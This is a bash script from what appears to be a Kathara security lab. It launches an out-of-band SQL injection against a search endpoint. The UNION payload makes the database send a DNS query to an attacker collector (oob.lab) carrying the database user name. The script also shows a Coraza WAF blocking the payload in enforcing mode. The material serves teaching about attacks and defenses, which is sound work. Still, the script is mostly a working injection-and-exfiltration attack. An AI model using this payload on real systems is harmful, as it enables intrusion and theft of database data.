#!/bin/bash
# run_oob.sh — out-of-band (OOB) SQLi attack.
# Injects a UNION payload through the vulnerable
# directory-search endpoint that makes the DATABASE emit a DNS query to the
# attacker's collector (oobsvc), with the DB user folded into the hostname.
# Recover the leaked value from the collector's log on the host:
#
#     tail -f shared/oob_dns.log        # from the lab dir on the host
#
# The proxy runs Coraza (OWASP CRS) on two ports, so the target port decides
# what is seen:
#   :8080  DETECTION-ONLY — WAF logs but FORWARDS, so the payload reaches the DB
#          and the OOB leak fires. This is the path for demoing the OOB attack
#          and the egress-control defense DEFAULT.
#   :80    ENFORCING       — WAF BLOCKS the UNION payload (HTTP 403); the attack
#          dies at the proxy and nothing leaks. Use this to show the WAF itself.
#
# Usage:
#   kathara exec attacker -- /scripts/run_oob.sh                      # :8080 (leak expected)
#   kathara exec attacker -- /scripts/run_oob.sh http://172.30.0.10   # :80 enforcing (WAF 403)
#   kathara exec attacker -- /scripts/run_oob.sh http://172.31.0.20:5000  # webapp direct (no proxy)
set -u

TARGET="${1:-http://172.30.0.10:8080}"
MARKER="${2:-oob}"

# UNION payload: the search query selects 7 columns, so the injected SELECT must
# too. oob_dns() is the loadable UDF on the db node; it sends the DNS query.
# The DB user (current_user) is sanitised (@ -> -at-) so it survives as a label.
PAYLOAD="' UNION SELECT oob_dns(CONCAT('${MARKER}-',REPLACE(CURRENT_USER(),'@','-at-'),'.oob.lab')),2,3,4,5,6,7-- -"

echo "[oob] target : ${TARGET}/search"
echo "[oob] payload: ${PAYLOAD}"
echo "[oob] firing..."
code=$(curl -s -G "${TARGET}/search" \
        --data-urlencode "q=${PAYLOAD}" \
        --data-urlencode "impl=concat" \
        -o /dev/null -w '%{http_code}' --max-time 10)
echo "[oob] HTTP ${code}"
case "${code}" in
    403) echo "[oob] 403 = the Coraza WAF (enforcing, :80) blocked the payload — nothing leaked." ;;
    200) echo "[oob] 200 = request accepted; check the collector log for the leak:  tail shared/oob_dns.log" ;;
    000) echo "[oob] 000 = could not connect (proxy down, or wrong port/target)." ;;
    *)   echo "[oob] check the collector log:  tail shared/oob_dns.log" ;;
esac
echo "[oob] a leak looks like:  ${MARKER}-portal-at-%.oob.lab  (that is current_user())."
